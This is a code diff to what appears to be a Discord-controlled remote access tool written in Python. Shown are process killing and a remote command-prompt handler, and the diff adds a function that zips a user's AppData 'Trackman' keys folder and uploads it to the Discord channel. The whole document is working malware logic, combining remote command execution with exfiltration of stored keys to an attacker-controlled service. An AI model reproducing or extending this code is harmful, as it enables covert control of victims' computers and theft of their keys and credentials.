@@ -1,4 +1,4 @@
-import psutil, os, discord, platform, requests, socket, pyperclip, datetime, uuid, tempfile, signal, subprocess, webbrowser, io, random, string
+import psutil, os, discord, platform, requests, socket, pyperclip, datetime, uuid, tempfile, signal, subprocess, webbrowser, io, random, string, pyzipper
 async def kp(ctx, name_or_pid: str):
     try:
         pid = int(name_or_pid)
@@ -140,4 +140,19 @@ async def cmd_command(ctx,*args):
         await ctx.send(file=discord.File(file,filename="output.txt"))
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")     
-# basically command prompt but remote        
+# basically command prompt but remote 
+async def zip_and_send_keys(ctx):
+    appdata_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Trackman", "keys")
+    zip_file_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Trackman", "keys.zip")
+    if os.path.exists(appdata_folder):
+        with pyzipper.AESZipFile(zip_file_path, 'w', compression=pyzipper.ZIP_DEFLATED) as zipf:
+            for foldername, subfolders, filenames in os.walk(appdata_folder):
+                for filename in filenames:
+                    file_path = os.path.join(foldername, filename)
+                    arcname = os.path.relpath(file_path, appdata_folder)
+                    zipf.write(file_path, arcname=arcname)
+        await ctx.send("Here is the zip of the keys folder:", file=discord.File(zip_file_path))
+        os.remove(zip_file_path)
+    else:
+        await ctx.send("No keys folder found to zip.")
+       
